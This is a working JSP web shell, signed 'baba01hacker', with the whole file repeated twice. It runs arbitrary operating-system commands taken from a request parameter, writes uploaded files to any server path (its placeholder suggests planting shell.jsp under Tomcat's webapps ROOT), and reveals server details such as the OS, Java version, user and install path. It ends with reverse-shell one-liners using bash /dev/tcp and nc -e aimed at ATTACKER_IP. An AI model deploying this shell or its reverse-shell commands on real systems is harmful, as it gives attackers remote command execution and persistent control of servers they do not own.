<%@ page import="java.io.*, java.util.*, java.net.*, javax.servlet.http.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // Command execution helper
    public String executeCommand(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            
            // Also capture error stream
            reader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = reader.readLine()) != null) {
                output.append("[ERR] ").append(line).append("\n");
            }
            reader.close();
            
        } catch (Exception e) {
            output.append("Exception: ").append(e.getMessage());
        }
        return output.toString();
    }
%>
<html>
<head>
    <title>JSP Webshell - baba01hacker</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; margin: 10px; }
        pre { background: #111; padding: 10px; overflow: auto; }
        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; font-family: monospace; }
    </style>
</head>
<body>
<h2>JSP Webshell (Old Container Compatible)</h2>

<!-- Command Execution -->
<form method="post">
    <b>Command:</b><br>
    <input type="text" name="cmd" size="80" value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "whoami" %>">
    <input type="submit" value="Execute">
</form>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.trim().isEmpty()) {
        out.println("<pre>" + executeCommand(cmd) + "</pre>");
    }
%>

<hr>

<!-- File Upload -->
<form method="post" enctype="multipart/form-data">
    <b>File Upload:</b><br>
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Target path (e.g. /usr/local/tomcat/webapps/ROOT/shell.jsp)" size="60">
    <input type="submit" value="Upload">
</form>

<%
    if ("POST".equalsIgnoreCase(request.getMethod()) && request.getPart("file") != null) {
        try {
            Part part = request.getPart("file");
            String fileName = part.getSubmittedFileName();
            String targetPath = request.getParameter("path");
            
            if (targetPath == null || targetPath.trim().isEmpty()) {
                targetPath = application.getRealPath("/") + "/" + fileName;
            }
            
            InputStream is = part.getInputStream();
            FileOutputStream fos = new FileOutputStream(targetPath);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
            fos.close();
            is.close();
            
            out.println("<pre style='color:yellow'>[+] Uploaded successfully to: " + targetPath + "</pre>");
        } catch (Exception e) {
            out.println("<pre style='color:red'>[-] Upload failed: " + e.getMessage() + "</pre>");
        }
    }
%>

<hr>

<!-- Basic Info -->
<pre>
<b>Server Info:</b>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
Java: <%= System.getProperty("java.version") %>
User: <%= System.getProperty("user.name") %>
Container: <%= application.getServerInfo() %>
Context Path: <%= application.getContextPath() %>
Real Path: <%= application.getRealPath("/") %>
</pre>

<!-- Reverse Shell Helper (one-liner examples) -->
<h3>Reverse Shell Examples (for old Java):</h3>
<pre>
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc -e /bin/sh ATTACKER_IP 4444
</pre>

</body>
</html><%@ page import="java.io.*, java.util.*, java.net.*, javax.servlet.http.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // Command execution helper
    public String executeCommand(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            
            // Also capture error stream
            reader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = reader.readLine()) != null) {
                output.append("[ERR] ").append(line).append("\n");
            }
            reader.close();
            
        } catch (Exception e) {
            output.append("Exception: ").append(e.getMessage());
        }
        return output.toString();
    }
%>
<html>
<head>
    <title>JSP Webshell - baba01hacker</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; margin: 10px; }
        pre { background: #111; padding: 10px; overflow: auto; }
        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; font-family: monospace; }
    </style>
</head>
<body>
<h2>JSP Webshell (Old Container Compatible)</h2>

<!-- Command Execution -->
<form method="post">
    <b>Command:</b><br>
    <input type="text" name="cmd" size="80" value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "whoami" %>">
    <input type="submit" value="Execute">
</form>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.trim().isEmpty()) {
        out.println("<pre>" + executeCommand(cmd) + "</pre>");
    }
%>

<hr>

<!-- File Upload -->
<form method="post" enctype="multipart/form-data">
    <b>File Upload:</b><br>
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Target path (e.g. /usr/local/tomcat/webapps/ROOT/shell.jsp)" size="60">
    <input type="submit" value="Upload">
</form>

<%
    if ("POST".equalsIgnoreCase(request.getMethod()) && request.getPart("file") != null) {
        try {
            Part part = request.getPart("file");
            String fileName = part.getSubmittedFileName();
            String targetPath = request.getParameter("path");
            
            if (targetPath == null || targetPath.trim().isEmpty()) {
                targetPath = application.getRealPath("/") + "/" + fileName;
            }
            
            InputStream is = part.getInputStream();
            FileOutputStream fos = new FileOutputStream(targetPath);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
            fos.close();
            is.close();
            
            out.println("<pre style='color:yellow'>[+] Uploaded successfully to: " + targetPath + "</pre>");
        } catch (Exception e) {
            out.println("<pre style='color:red'>[-] Upload failed: " + e.getMessage() + "</pre>");
        }
    }
%>

<hr>

<!-- Basic Info -->
<pre>
<b>Server Info:</b>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
Java: <%= System.getProperty("java.version") %>
User: <%= System.getProperty("user.name") %>
Container: <%= application.getServerInfo() %>
Context Path: <%= application.getContextPath() %>
Real Path: <%= application.getRealPath("/") %>
</pre>

<!-- Reverse Shell Helper (one-liner examples) -->
<h3>Reverse Shell Examples (for old Java):</h3>
<pre>
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc -e /bin/sh ATTACKER_IP 4444
</pre>

</body>
</html>
